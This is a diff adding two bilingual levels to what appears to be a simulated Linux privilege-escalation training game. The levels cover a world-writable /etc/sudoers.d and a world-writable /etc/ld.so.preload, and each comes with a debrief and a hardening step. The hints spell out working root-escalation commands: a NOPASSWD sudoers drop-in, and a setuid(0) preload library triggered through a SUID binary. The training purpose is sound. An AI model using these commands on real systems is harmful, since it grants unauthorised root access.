@@ -1066,5 +1066,162 @@ ZW3vYmFja3VwLWtleS1sZWFrZWQtZG8tbm90LXVzZS1pbi1wcm9kAAAAAAECAwQF
                 link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reading-root-ssh-keys'
             }
         }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 14 — Writable /etc/sudoers.d drop-in
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 14,
+        codename: 'box-14',
+        title: { en: 'Box-14 · Drop-in Privilege', fr: 'Box-14 · Privilège en drop-in' },
+        brief: {
+            en: 'The /etc/sudoers.d directory is world-writable. sudo honours every rule dropped there — so write your own.',
+            fr: 'Le dossier /etc/sudoers.d est modifiable par tous. sudo applique toute règle qu\'on y dépose — écris donc la tienne.'
+        },
+        user: 'player',
+        host: 'box-14',
+        cwd: '/home/player',
+        objectives: {
+            en: ['Notice /etc/sudoers.d is writable', 'Drop a NOPASSWD rule for yourself', 'Use sudo to get a root shell'],
+            fr: ['Repérer que /etc/sudoers.d est modifiable', 'Déposer une règle NOPASSWD pour toi', 'Utiliser sudo pour un shell root']
+        },
+        hints: {
+            en: [
+                'ls -la /etc/sudoers.d — the directory is world-writable, and sudo reads every file inside it.',
+                "Drop a rule granting yourself everything:\n  echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn",
+                'Now escalate:\n  sudo bash'
+            ],
+            fr: [
+                'ls -la /etc/sudoers.d — le dossier est modifiable par tous, et sudo lit chaque fichier dedans.',
+                "Dépose une règle qui t'accorde tout :\n  echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn",
+                'Puis escalade :\n  sudo bash'
+            ]
+        },
+        flag: 'flag{sud0ers_d_dr0pin}',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
+            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers', 'sudoers.d'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
+            '/etc/sudoers.d': { type: 'dir', owner: 'root', mode: '777', writable_by_all: true, children: ['README'] },
+            '/etc/sudoers.d/README': { type: 'file', owner: 'root', mode: '644', content: '# Drop-in sudoers snippets go here.\n# (Directory perms are wrong — it is world-writable!)\n' },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{sud0ers_d_dr0pin}\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        wins: [
+            { type: 'sudo_shell' }
+        ],
+        harden: {
+            type: 'lock_perms', target: '/etc/sudoers.d',
+            obj: { en: 'Fix the permissions on /etc/sudoers.d (755)', fr: 'Corrige les permissions de /etc/sudoers.d (755)' },
+            hint: { en: 'chmod 755 /etc/sudoers.d', fr: 'chmod 755 /etc/sudoers.d' }
+        },
+        debrief: {
+            en: {
+                vuln: 'World-writable /etc/sudoers.d directory',
+                why: 'sudo includes every file in /etc/sudoers.d. Because the directory was world-writable, any user could drop a file granting themselves NOPASSWD: ALL and immediately run a root shell — no exploit, just a misconfigured permission.',
+                fix: 'The /etc/sudoers.d directory and its files must be owned by root and mode 755 / 440. Audit sudo drop-ins, validate with visudo -c, and alert on any write to sudoers paths.',
+                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid'
+            },
+            fr: {
+                vuln: 'Dossier /etc/sudoers.d modifiable par tous',
+                why: 'sudo inclut chaque fichier de /etc/sudoers.d. Le dossier étant modifiable par tous, n\'importe qui pouvait y déposer un fichier s\'octroyant NOPASSWD: ALL et ouvrir aussitôt un shell root — sans exploit, juste une permission mal configurée.',
+                fix: 'Le dossier /etc/sudoers.d et ses fichiers doivent appartenir à root en mode 755 / 440. Audite les drop-ins sudo, valide avec visudo -c, et alerte sur toute écriture dans les chemins sudoers.',
+                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid'
+            }
+        }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 15 — Writable /etc/ld.so.preload
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 15,
+        codename: 'box-15',
+        title: { en: 'Box-15 · Preload, Globally', fr: 'Box-15 · Préchargement global' },
+        brief: {
+            en: '/etc/ld.so.preload injects a library into every dynamically linked program — including SUID root ones. It is writable here.',
+            fr: '/etc/ld.so.preload injecte une bibliothèque dans chaque programme lié dynamiquement — y compris les SUID root. Il est modifiable ici.'
+        },
+        user: 'player',
+        host: 'box-15',
+        cwd: '/home/player',
+        objectives: {
+            en: ['Spot the writable /etc/ld.so.preload', 'Build a library that pops a root shell', 'Trigger it via any SUID binary'],
+            fr: ['Repérer /etc/ld.so.preload modifiable', 'Construire une bibliothèque qui ouvre un shell root', 'La déclencher via un binaire SUID']
+        },
+        hints: {
+            en: [
+                'ls -la /etc/ld.so.preload — world-writable. Every SUID binary loads whatever it lists.',
+                'Build the library and register it:\n  echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c\n  echo /tmp/x.so > /etc/ld.so.preload',
+                'Trigger it by running any SUID binary:\n  /usr/bin/passwd'
+            ],
+            fr: [
+                'ls -la /etc/ld.so.preload — modifiable par tous. Chaque binaire SUID charge ce qu\'il liste.',
+                'Construis la bibliothèque et enregistre-la :\n  echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c\n  echo /tmp/x.so > /etc/ld.so.preload',
+                'Déclenche-la en lançant un binaire SUID :\n  /usr/bin/passwd'
+            ]
+        },
+        flag: 'flag{ld_s0_preload_glob4l}',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
+            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'ld.so.preload'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/etc/ld.so.preload': { type: 'file', owner: 'root', mode: '666', writable_by_all: true, content: '' },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{ld_s0_preload_glob4l}\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'gcc', 'passwd'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/gcc': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/passwd': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        wins: [
+            { type: 'ld_so_preload' }
+        ],
+        harden: {
+            type: 'lock_perms', target: '/etc/ld.so.preload',
+            obj: { en: 'Remove write access to /etc/ld.so.preload (644)', fr: 'Retire l\'accès en écriture à /etc/ld.so.preload (644)' },
+            hint: { en: 'chmod 644 /etc/ld.so.preload', fr: 'chmod 644 /etc/ld.so.preload' }
+        },
+        debrief: {
+            en: {
+                vuln: 'World-writable /etc/ld.so.preload',
+                why: 'The dynamic linker preloads every library listed in /etc/ld.so.preload into all dynamically linked programs, SUID root ones included. With the file world-writable, an attacker points it at a malicious .so whose constructor runs setuid(0)/system — the next SUID binary executes it as root.',
+                fix: '/etc/ld.so.preload must be root-owned and mode 644 (or absent). Monitor it for changes, and audit SUID binaries. Consider mounting sensitive config read-only or using a MAC policy (AppArmor/SELinux).',
+                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
+            },
+            fr: {
+                vuln: '/etc/ld.so.preload modifiable par tous',
+                why: 'Le linker dynamique précharge chaque bibliothèque listée dans /etc/ld.so.preload dans tous les programmes liés dynamiquement, y compris les SUID root. Le fichier étant modifiable par tous, un attaquant le pointe vers un .so malveillant dont le constructeur fait setuid(0)/system — le prochain binaire SUID l\'exécute en root.',
+                fix: '/etc/ld.so.preload doit appartenir à root en mode 644 (ou être absent). Surveille ses modifications, audite les binaires SUID, et envisage un montage en lecture seule ou une politique MAC (AppArmor/SELinux).',
+                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
+            }
+        }
     }
 ];
